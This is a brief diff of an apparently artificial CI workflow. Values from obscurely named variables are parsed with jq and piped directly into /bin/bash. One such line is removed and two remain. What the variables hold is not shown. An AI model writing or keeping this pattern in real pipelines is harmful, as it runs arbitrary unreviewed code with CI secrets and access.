@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$tssj58989" | jq -r .ekq15 | /bin/bash
           echo $nf805 | jq -r .uc88613 | /bin/bash
-          echo $nyn59948 | jq -r .dlz24678 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
